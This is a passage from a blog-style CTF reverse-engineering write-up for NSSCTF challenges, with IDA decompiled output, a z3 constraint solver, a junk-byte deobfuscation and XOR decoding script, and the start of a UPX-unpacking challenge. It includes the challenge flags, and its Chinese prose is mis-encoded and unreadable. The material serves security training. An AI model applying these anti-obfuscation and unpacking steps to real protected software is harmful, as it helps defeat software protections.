class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">check</span><span class="params">(_BYTE *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+20h] [rbp-A0h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+24h] [rbp-9Ch]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+28h] [rbp-98h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+2Ch] [rbp-94h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+30h] [rbp-90h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+34h] [rbp-8Ch]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+38h] [rbp-88h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+3Ch] [rbp-84h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [rsp+40h] [rbp-80h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [rsp+44h] [rbp-7Ch]</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [rsp+48h] [rbp-78h]</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [rsp+4Ch] [rbp-74h]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [rsp+50h] [rbp-70h]</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// [rsp+54h] [rbp-6Ch]</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// [rsp+58h] [rbp-68h]</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// [rsp+5Ch] [rbp-64h]</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// [rsp+60h] [rbp-60h]</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// [rsp+64h] [rbp-5Ch]</span></span><br><span class="line">  <span class="type">int</span> v20; <span class="comment">// [rsp+68h] [rbp-58h]</span></span><br><span class="line">  <span class="type">int</span> v21; <span class="comment">// [rsp+6Ch] [rbp-54h]</span></span><br><span class="line">  <span class="type">int</span> v22; <span class="comment">// [rsp+70h] [rbp-50h]</span></span><br><span class="line">  <span class="type">int</span> v23; <span class="comment">// [rsp+74h] [rbp-4Ch]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+ACh] [rbp-14h]</span></span><br><span class="line">  _BYTE *i; <span class="comment">// [rsp+B0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v26; <span class="comment">// [rsp+BCh] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v26 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = a1; *i; ++i )</span><br><span class="line">    ++v26;</span><br><span class="line">  <span class="keyword">if</span> ( v26 == <span class="number">22</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; v26; ++j )</span><br><span class="line">      *(&amp;v2 + j) = (<span class="type">char</span>)a1[j];</span><br><span class="line">    <span class="keyword">if</span> ( <span class="number">245</span> * v6 + <span class="number">395</span> * v5 + <span class="number">3541</span> * v4 + <span class="number">2051</span> * v3 + <span class="number">3201</span> * v2 + <span class="number">1345</span> * v7 != <span class="number">855009</span></span><br><span class="line">      || <span class="number">3270</span> * v6 + <span class="number">3759</span> * v5 + <span class="number">3900</span> * v4 + <span class="number">3963</span> * v3 + <span class="number">1546</span> * v2 + <span class="number">3082</span> * v7 != <span class="number">1515490</span></span><br><span class="line">      || <span class="number">526</span> * v6 + <span class="number">2283</span> * v5 + <span class="number">3349</span> * v4 + <span class="number">2458</span> * v3 + <span class="number">2012</span> * v2 + <span class="number">268</span> * v7 != <span class="number">854822</span></span><br><span class="line">      || <span class="number">3208</span> * v6 + <span class="number">2021</span> * v5 + <span class="number">3146</span> * v4 + <span class="number">1571</span> * v3 + <span class="number">2569</span> * v2 + <span class="number">1395</span> * v7 != <span class="number">1094422</span></span><br><span class="line">      || <span class="number">3136</span> * v6 + <span class="number">3553</span> * v5 + <span class="number">2997</span> * v4 + <span class="number">1824</span> * v3 + <span class="number">1575</span> * v2 + <span class="number">1599</span> * v7 != <span class="number">1136398</span></span><br><span class="line">      || <span class="number">2300</span> * v6 + <span class="number">1349</span> * v5 + <span class="number">86</span> * v4 + <span class="number">3672</span> * v3 + <span class="number">2908</span> * v2 + <span class="number">1681</span> * v7 != <span class="number">939991</span></span><br><span class="line">      || <span class="number">212</span> * v22 + <span class="number">153</span> * v21 + <span class="number">342</span> * v20 + <span class="number">490</span> * v12 + <span class="number">325</span> * v11 + <span class="number">485</span> * v10 + <span class="number">56</span> * v9 + <span class="number">202</span> * v8 + <span class="number">191</span> * v23 != <span class="number">245940</span></span><br><span class="line">      || <span class="number">348</span> * v22 + <span class="number">185</span> * v21 + <span class="number">134</span> * v20 + <span class="number">153</span> * v12 + <span class="number">460</span> * v9 + <span class="number">207</span> * v8 + <span class="number">22</span> * v10 + <span class="number">24</span> * v11 + <span class="number">22</span> * v23 != <span class="number">146392</span></span><br><span class="line">      || <span class="number">177</span> * v22 + <span class="number">231</span> * v21 + <span class="number">489</span> * v20 + <span class="number">339</span> * v12 + <span class="number">433</span> * v11 + <span class="number">311</span> * v10 + <span class="number">164</span> * v9 + <span class="number">154</span> * v8 + <span class="number">100</span> * v23 != <span class="number">239438</span></span><br><span class="line">      || <span class="number">68</span> * v20 + <span class="number">466</span> * v12 + <span class="number">470</span> * v11 + <span class="number">22</span> * v10 + <span class="number">270</span> * v9 + <span class="number">360</span> * v8 + <span class="number">337</span> * v21 + <span class="number">257</span> * v22 + <span class="number">82</span> * v23 != <span class="number">233887</span></span><br><span class="line">      || <span class="number">246</span> * v22 + <span class="number">235</span> * v21 + <span class="number">468</span> * v20 + <span class="number">91</span> * v12 + <span class="number">151</span> * v11 + <span class="number">197</span> * v8 + <span class="number">92</span> * v9 + <span class="number">73</span> * v10 + <span class="number">54</span> * v23 != <span class="number">152663</span></span><br><span class="line">      || <span class="number">241</span> * v22 + <span class="number">377</span> * v21 + <span class="number">131</span> * v20 + <span class="number">243</span> * v12 + <span class="number">233</span> * v11 + <span class="number">55</span> * v10 + <span class="number">376</span> * v9 + <span class="number">242</span> * v8 + <span class="number">343</span> * v23 != <span class="number">228375</span></span><br><span class="line">      || <span class="number">356</span> * v22 + <span class="number">200</span> * v21 + <span class="number">136</span> * v11 + <span class="number">301</span> * v10 + <span class="number">284</span> * v9 + <span class="number">364</span> * v8 + <span class="number">458</span> * v12 + <span class="number">5</span> * v20 + <span class="number">61</span> * v23 != <span class="number">211183</span></span><br><span class="line">      || <span class="number">154</span> * v22 + <span class="number">55</span> * v21 + <span class="number">406</span> * v20 + <span class="number">107</span> * v12 + <span class="number">80</span> * v10 + <span class="number">66</span> * v8 + <span class="number">71</span> * v9 + <span class="number">17</span> * v11 + <span class="number">71</span> * v23 != <span class="number">96788</span></span><br><span class="line">      || <span class="number">335</span> * v22 + <span class="number">201</span> * v21 + <span class="number">197</span> * v11 + <span class="number">280</span> * v10 + <span class="number">409</span> * v9 + <span class="number">56</span> * v8 + <span class="number">494</span> * v12 + <span class="number">63</span> * v20 + <span class="number">99</span> * v23 != <span class="number">204625</span></span><br><span class="line">      || <span class="number">428</span> * v18 + <span class="number">1266</span> * v17 + <span class="number">1326</span> * v16 + <span class="number">1967</span> * v15 + <span class="number">3001</span> * v14 + <span class="number">81</span> * v13 + <span class="number">2439</span> * v19 != <span class="number">1109296</span></span><br><span class="line">      || <span class="number">2585</span> * v18 + <span class="number">4027</span> * v17 + <span class="number">141</span> * v16 + <span class="number">2539</span> * v15 + <span class="number">3073</span> * v14 + <span class="number">164</span> * v13 + <span class="number">1556</span> * v19 != <span class="number">1368547</span></span><br><span class="line">      || <span class="number">2080</span> * v18 + <span class="number">358</span> * v17 + <span class="number">1317</span> * v16 + <span class="number">1341</span> * v15 + <span class="number">3681</span> * v14 + <span class="number">2197</span> * v13 + <span class="number">1205</span> * v19 != <span class="number">1320274</span></span><br><span class="line">      || <span class="number">840</span> * v18 + <span class="number">1494</span> * v17 + <span class="number">2353</span> * v16 + <span class="number">235</span> * v15 + <span class="number">3843</span> * v14 + <span class="number">1496</span> * v13 + <span class="number">1302</span> * v19 != <span class="number">1206735</span></span><br><span class="line">      || <span class="number">101</span> * v18 + <span class="number">2025</span> * v17 + <span class="number">2842</span> * v16 + <span class="number">1559</span> * v15 + <span class="number">2143</span> * v14 + <span class="number">3008</span> * v13 + <span class="number">981</span> * v19 != <span class="number">1306983</span></span><br><span class="line">      || <span class="number">1290</span> * v18 + <span class="number">3822</span> * v17 + <span class="number">1733</span> * v16 + <span class="number">292</span> * v15 + <span class="number">816</span> * v14 + <span class="number">1017</span> * v13 + <span class="number">3199</span> * v19 != <span class="number">1160573</span></span><br><span class="line">      || (result = (<span class="type">unsigned</span> <span class="type">int</span>)(<span class="number">186</span> * v18 + <span class="number">2712</span> * v17 + <span class="number">2136</span> * v16 + <span class="number">98</span> * v13 + <span class="number">138</span> * v14 + <span class="number">3584</span> * v15 + <span class="number">1173</span> * v19),</span><br><span class="line">          (_DWORD)result != <span class="number">1005746</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>z3è§£æ–¹ç¨‹</p><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">flag=[<span class="number">0</span>]*<span class="number">22</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">22</span>):</span><br><span class="line">    flag[i] = z3.Int(<span class="string">&quot;flag[%d]&quot;</span>%i)</span><br><span class="line">S=Solver()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">S.add(<span class="number">3201</span>*flag[<span class="number">0</span>]+<span class="number">2051</span>*flag[<span class="number">1</span>]+<span class="number">3541</span>*flag[<span class="number">2</span>]+<span class="number">395</span>*flag[<span class="number">3</span>]+<span class="number">245</span>*flag[<span class="number">4</span>]+<span class="number">1345</span>*flag[<span class="number">5</span>]==<span class="number">855009</span>,</span><br><span class="line"><span class="number">1546</span>*flag[<span class="number">0</span>]+<span class="number">3963</span>*flag[<span class="number">1</span>]+<span class="number">3900</span>*flag[<span class="number">2</span>]+<span class="number">3759</span>*flag[<span class="number">3</span>]+<span class="number">3270</span>*flag[<span class="number">4</span>]+<span class="number">3082</span>*flag[<span class="number">5</span>]==<span class="number">1515490</span>,</span><br><span class="line"><span class="number">2012</span>*flag[<span class="number">0</span>]+<span class="number">2458</span>*flag[<span class="number">1</span>]+<span class="number">3349</span>*flag[<span class="number">2</span>]+<span class="number">2283</span>*flag[<span class="number">3</span>]+<span class="number">526</span>*flag[<span class="number">4</span>]+<span class="number">268</span>*flag[<span class="number">5</span>]==<span class="number">854822</span>,</span><br><span class="line"><span class="number">2569</span>*flag[<span class="number">0</span>]+<span class="number">1571</span>*flag[<span class="number">1</span>]+<span class="number">3146</span>*flag[<span class="number">2</span>]+<span class="number">2021</span>*flag[<span class="number">3</span>]+<span class="number">3208</span>*flag[<span class="number">4</span>]+<span class="number">1395</span>*flag[<span class="number">5</span>]==<span class="number">1094422</span>,</span><br><span class="line"><span class="number">1575</span>*flag[<span class="number">0</span>]+<span class="number">1824</span>*flag[<span class="number">1</span>]+<span class="number">2997</span>*flag[<span class="number">2</span>]+<span class="number">3553</span>*flag[<span class="number">3</span>]+<span class="number">3136</span>*flag[<span class="number">4</span>]+<span class="number">1599</span>*flag[<span class="number">5</span>]==<span class="number">1136398</span>,</span><br><span class="line"><span class="number">2908</span>*flag[<span class="number">0</span>]+<span class="number">3672</span>*flag[<span class="number">1</span>]+<span class="number">86</span>*flag[<span class="number">2</span>]+<span class="number">1349</span>*flag[<span class="number">3</span>]+<span class="number">2300</span>*flag[<span class="number">4</span>]+<span class="number">1681</span>*flag[<span class="number">5</span>]==<span class="number">939991</span>,</span><br><span class="line">flag[<span class="number">6</span>]*<span class="number">202</span>+flag[<span class="number">7</span>]*<span class="number">56</span>+flag[<span class="number">8</span>]*<span class="number">485</span>+flag[<span class="number">9</span>]*<span class="number">325</span>+flag[<span class="number">10</span>]*<span class="number">490</span>+flag[<span class="number">18</span>]*<span class="number">342</span>+flag[<span class="number">19</span>]*<span class="number">153</span>+flag[<span class="number">20</span>]*<span class="number">212</span>+flag[<span class="number">21</span>]*<span class="number">191</span>==<span class="number">245940</span>,</span><br><span class="line">flag[<span class="number">6</span>]*<span class="number">207</span>+flag[<span class="number">7</span>]*<span class="number">460</span>+flag[<span class="number">8</span>]*<span class="number">22</span>+flag[<span class="number">9</span>]*<span class="number">24</span>+flag[<span class="number">10</span>]*<span class="number">153</span>+flag[<span class="number">18</span>]*<span class="number">134</span>+flag[<span class="number">19</span>]*<span class="number">185</span>+flag[<span class="number">20</span>]*<span class="number">348</span>+flag[<span class="number">21</span>]*<span class="number">22</span>==<span class="number">146392</span>,</span><br><span class="line">flag[<span class="number">6</span>]*<span class="number">154</span>+flag[<span class="number">7</span>]*<span class="number">164</span>+flag[<span class="number">8</span>]*<span class="number">311</span>+flag[<span class="number">9</span>]*<span class="number">433</span>+flag[<span class="number">10</span>]*<span class="number">339</span>+flag[<span class="number">18</span>]*<span class="number">489</span>+flag[<span class="number">19</span>]*<span class="number">231</span>+flag[<span class="number">20</span>]*<span class="number">177</span>+flag[<span class="number">21</span>]*<span class="number">100</span>==<span class="number">239438</span>,</span><br><span class="line">flag[<span class="number">6</span>]*<span class="number">360</span>+flag[<span class="number">7</span>]*<span class="number">270</span>+flag[<span class="number">8</span>]*<span class="number">22</span>+flag[<span class="number">9</span>]*<span class="number">470</span>+flag[<span class="number">10</span>]*<span class="number">466</span>+flag[<span class="number">18</span>]*<span class="number">68</span>+flag[<span class="number">19</span>]*<span class="number">337</span>+flag[<span class="number">20</span>]*<span class="number">257</span>+flag[<span class="number">21</span>]*<span class="number">82</span>==<span class="number">233887</span>,</span><br><span class="line">flag[<span class="number">6</span>]*<span class="number">197</span>+flag[<span class="number">7</span>]*<span class="number">92</span>+flag[<span class="number">8</span>]*<span class="number">73</span>+flag[<span class="number">9</span>]*<span class="number">151</span>+flag[<span class="number">10</span>]*<span class="number">91</span>+flag[<span class="number">18</span>]*<span class="number">468</span>+flag[<span class="number">19</span>]*<span class="number">235</span>+flag[<span class="number">20</span>]*<span class="number">246</span>+flag[<span class="number">21</span>]*<span class="number">54</span>==<span class="number">152663</span>,</span><br><span class="line">flag[<span class="number">6</span>]*<span class="number">242</span>+flag[<span class="number">7</span>]*<span class="number">376</span>+flag[<span class="number">8</span>]*<span class="number">55</span>+flag[<span class="number">9</span>]*<span class="number">233</span>+flag[<span class="number">10</span>]*<span class="number">243</span>+flag[<span class="number">18</span>]*<span class="number">131</span>+flag[<span class="number">19</span>]*<span class="number">377</span>+flag[<span class="number">20</span>]*<span class="number">241</span>+flag[<span class="number">21</span>]*<span class="number">343</span>==<span class="number">228375</span>,</span><br><span class="line">flag[<span class="number">6</span>]*<span class="number">364</span>+flag[<span class="number">7</span>]*<span class="number">284</span>+flag[<span class="number">8</span>]*<span class="number">301</span>+flag[<span class="number">9</span>]*<span class="number">136</span>+flag[<span class="number">10</span>]*<span class="number">458</span>+flag[<span class="number">18</span>]*<span class="number">5</span>+flag[<span class="number">19</span>]*<span class="number">200</span>+flag[<span class="number">20</span>]*<span class="number">356</span>+flag[<span class="number">21</span>]*<span class="number">61</span>==<span class="number">211183</span>,</span><br><span class="line">flag[<span class="number">6</span>]*<span class="number">66</span>+flag[<span class="number">7</span>]*<span class="number">71</span>+flag[<span class="number">8</span>]*<span class="number">80</span>+flag[<span class="number">9</span>]*<span class="number">17</span>+flag[<span class="number">10</span>]*<span class="number">107</span>+flag[<span class="number">18</span>]*<span class="number">406</span>+flag[<span class="number">19</span>]*<span class="number">55</span>+flag[<span class="number">20</span>]*<span class="number">154</span>+flag[<span class="number">21</span>]*<span class="number">71</span>==<span class="number">96788</span>,</span><br><span class="line">flag[<span class="number">6</span>]*<span class="number">56</span>+flag[<span class="number">7</span>]*<span class="number">409</span>+flag[<span class="number">8</span>]*<span class="number">280</span>+flag[<span class="number">9</span>]*<span class="number">197</span>+flag[<span class="number">10</span>]*<span class="number">494</span>+flag[<span class="number">18</span>]*<span class="number">63</span>+flag[<span class="number">19</span>]*<span class="number">201</span>+flag[<span class="number">20</span>]*<span class="number">335</span>+flag[<span class="number">21</span>]*<span class="number">99</span>==<span class="number">204625</span>,</span><br><span class="line"><span class="number">81</span>*flag[<span class="number">11</span>]+<span class="number">3001</span>*flag[<span class="number">12</span>]+<span class="number">1967</span>*flag[<span class="number">13</span>]+<span class="number">1326</span>*flag[<span class="number">14</span>]+<span class="number">1266</span>*flag[<span class="number">15</span>]+<span class="number">428</span>*flag[<span class="number">16</span>]+<span class="number">2439</span>*flag[<span class="number">17</span>]==<span class="number">1109296</span>,</span><br><span class="line"><span class="number">164</span>*flag[<span class="number">11</span>]+<span class="number">3073</span>*flag[<span class="number">12</span>]+<span class="number">2539</span>*flag[<span class="number">13</span>]+<span class="number">141</span>*flag[<span class="number">14</span>]+<span class="number">4027</span>*flag[<span class="number">15</span>]+<span class="number">2585</span>*flag[<span class="number">16</span>]+<span class="number">1556</span>*flag[<span class="number">17</span>]==<span class="number">1368547</span>,</span><br><span class="line"><span class="number">2197</span>*flag[<span class="number">11</span>]+<span class="number">3681</span>*flag[<span class="number">12</span>]+<span class="number">1341</span>*flag[<span class="number">13</span>]+<span class="number">1317</span>*flag[<span class="number">14</span>]+<span class="number">358</span>*flag[<span class="number">15</span>]+<span class="number">2080</span>*flag[<span class="number">16</span>]+<span class="number">1205</span>*flag[<span class="number">17</span>]==<span class="number">1320274</span>,</span><br><span class="line"><span class="number">1496</span>*flag[<span class="number">11</span>]+<span class="number">3843</span>*flag[<span class="number">12</span>]+<span class="number">235</span>*flag[<span class="number">13</span>]+<span class="number">2353</span>*flag[<span class="number">14</span>]+<span class="number">1494</span>*flag[<span class="number">15</span>]+<span class="number">840</span>*flag[<span class="number">16</span>]+<span class="number">1302</span>*flag[<span class="number">17</span>]==<span class="number">1206735</span>,</span><br><span class="line"><span class="number">3008</span>*flag[<span class="number">11</span>]+<span class="number">2143</span>*flag[<span class="number">12</span>]+<span class="number">1559</span>*flag[<span class="number">13</span>]+<span class="number">2842</span>*flag[<span class="number">14</span>]+<span class="number">2025</span>*flag[<span class="number">15</span>]+<span class="number">101</span>*flag[<span class="number">16</span>]+<span class="number">981</span>*flag[<span class="number">17</span>]==<span class="number">1306983</span>,</span><br><span class="line"><span class="number">1017</span>*flag[<span class="number">11</span>]+<span class="number">816</span>*flag[<span class="number">12</span>]+<span class="number">292</span>*flag[<span class="number">13</span>]+<span class="number">1733</span>*flag[<span class="number">14</span>]+<span class="number">3822</span>*flag[<span class="number">15</span>]+<span class="number">1290</span>*flag[<span class="number">16</span>]+<span class="number">3199</span>*flag[<span class="number">17</span>]==<span class="number">1160573</span>,</span><br><span class="line"><span class="number">98</span>*flag[<span class="number">11</span>]+<span class="number">138</span>*flag[<span class="number">12</span>]+<span class="number">3584</span>*flag[<span class="number">13</span>]+<span class="number">2136</span>*flag[<span class="number">14</span>]+<span class="number">2712</span>*flag[<span class="number">15</span>]+<span class="number">186</span>*flag[<span class="number">16</span>]+<span class="number">1173</span>*flag[<span class="number">17</span>]==<span class="number">1005746</span>)</span><br><span class="line">S.check()</span><br><span class="line">t = S.model()</span><br><span class="line"><span class="built_in">print</span>(t)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">22</span>):</span><br><span class="line">    <span class="keyword">try</span>:<span class="built_in">print</span>(t[flag[i]],end=<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:<span class="keyword">pass</span></span><br><span class="line">sb = [<span class="number">78</span>,<span class="number">83</span>,<span class="number">83</span>,<span class="number">67</span>,<span class="number">84</span>,<span class="number">70</span>,<span class="number">123</span>,<span class="number">112</span>,<span class="number">105</span>,<span class="number">112</span>,<span class="number">95</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">115</span>,<span class="number">116</span>,<span class="number">64</span>,<span class="number">108</span>,<span class="number">108</span>,<span class="number">95</span>,<span class="number">90</span>,<span class="number">51</span>,<span class="number">125</span>,]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> sb:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>NSSCTF{pip_inst@ll_Z3}</p><h2 id="e-sy-flower"><a href="#e-sy-flower" class="headerlink" title="e@sy_flower"></a>e@sy_flower</h2><p>å¾ˆæ˜æ˜¾çš„èŠ±æŒ‡ä»¤ã€‚</p><p><img src="https://s2.loli.net/2023/08/04/7ncxlk18AupzWwF.png" alt="image-20221023100120874.png"></p><p>ä¸€èˆ¬æ¥è¯´ï¼Œæ±‡ç¼–è¯­è¨€çš„è·³è½¬åº”è¯¥æ˜¯ç›´æ¥æ˜¯ä¸€ä¸ªåœ°å€ï¼Œè€Œä¸ä¼šå‡ºç°+1è¿™ç§æƒ…å†µï¼Œå‡ºç°è¿™ç§æƒ…å†µä¸€èˆ¬æ˜¯ç”±è„å­—å¯¼è‡´ï¼Œäºæ˜¯æˆ‘ä»¬æŠŠçˆ†çº¢çš„åœ°æ–¹æŒ‰å¿«æ·é”®uè½¬åŒ–ä¸ºæ•°æ®ï¼Œå¯ä»¥çœ‹åˆ°ï¼ŒD4å¤„æ˜¯åƒåœ¾æ•°æ®ï¼Œæ­£å¸¸çš„å‡½æ•°åº”è¯¥æ˜¯ä»unk_401D5å¤„å¼€å§‹çš„ï¼Œè€Œç”±äºè„å­—çš„åŠ å…¥å¯¼è‡´åç¼–è¯‘å¤±è´¥ã€‚</p><p><img src="https://s2.loli.net/2023/08/04/HW5hTlBycGvbi4s.png" alt="image-20221023101053945.png"></p><p>æŒ‰å¿«æ·é”®cæŠŠunk_401D5åçš„æ•°æ®è½¬åŒ–æˆä»£ç ï¼ŒåŒæ—¶æŠŠåƒåœ¾æ•°æ®nopæ‰å³å¯ï¼ŒæŠŠé”™è¯¯çš„åœ°æ–¹æŒ‰pé‡æ–°è¯†åˆ«ä¸ºå‡½æ•°ã€‚</p><p><img src="https://s2.loli.net/2023/08/04/8OqfcXL5s2axKlb.png" alt="image-20221023100609377.png"></p><p>ä¸»å‡½æ•°ç¼–è¯‘å‡ºæ¥äº†ã€‚åŠ å¯†é€»è¾‘å°±æ˜¯è¾“å…¥æ•°æ®çš„<code>v[2*i-1]</code>å’Œ<code>v[2*i]</code>äº¤æ¢åå’Œ0x30å¼‚æˆ–ã€‚</p><p><img src="https://s2.loli.net/2023/08/04/pM67YJPsmwUL8Ze.png" alt="image-20221023102052453.png"></p><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span> = [<span class="number">0x63</span>, <span class="number">0x7E</span>, <span class="number">0x73</span>, <span class="number">0x63</span>, <span class="number">0x76</span>, <span class="number">0x64</span>, <span class="number">0x7A</span>, <span class="number">0x4B</span>, <span class="number">0x43</span>, <span class="number">0x45</span>, </span><br><span class="line">      <span class="number">0x6F</span>, <span class="number">0x44</span>, <span class="number">0x45</span>, <span class="number">0x5A</span>, <span class="number">0x5B</span>, <span class="number">0x5E</span>, <span class="number">0x72</span>, <span class="number">0x6F</span>, <span class="number">0x44</span>, <span class="number">0x49</span>, </span><br><span class="line">      <span class="number">0x43</span>, <span class="number">0x55</span>, <span class="number">0x4D</span>, <span class="number">0x43</span>]</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, (<span class="built_in">len</span>(<span class="built_in">str</span>)+<span class="number">1</span>)//<span class="number">2</span>):</span><br><span class="line">    temp = <span class="built_in">str</span>[<span class="number">2</span>*i]</span><br><span class="line">    <span class="built_in">str</span>[<span class="number">2</span>*i] = <span class="built_in">str</span>[<span class="number">2</span>*i+<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">str</span>[<span class="number">2</span>*i+<span class="number">1</span>] = temp</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(<span class="built_in">str</span>)):</span><br><span class="line">    ans = <span class="built_in">str</span>[i] ^ <span class="number">0x30</span></span><br><span class="line">    flag = flag + <span class="built_in">chr</span>(ans)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>NSSCTF{Just_junk_Bytess}</p><h2 id="Packet"><a href="#Packet" class="headerlink" title="Packet"></a>Packet</h2><p>æŸ¥å£³åå‘ç°ç¨‹åºåŠ å£³äº†ï¼Œæ˜¯upx3.96ã€‚è„±å£³å³å¯ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> Str2[<span class="number">160</span>]; <span class="comment">// [rsp+20h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">128</span>]; <span class="comment">// [rsp+C0h] [rbp+40h] BYREF</span></span><br><span class="line"></span><br><span class="line">  _main();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input your flag:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, v5);</span><br><span class="line">  <span class="built_in">do_something</span>(Str2, 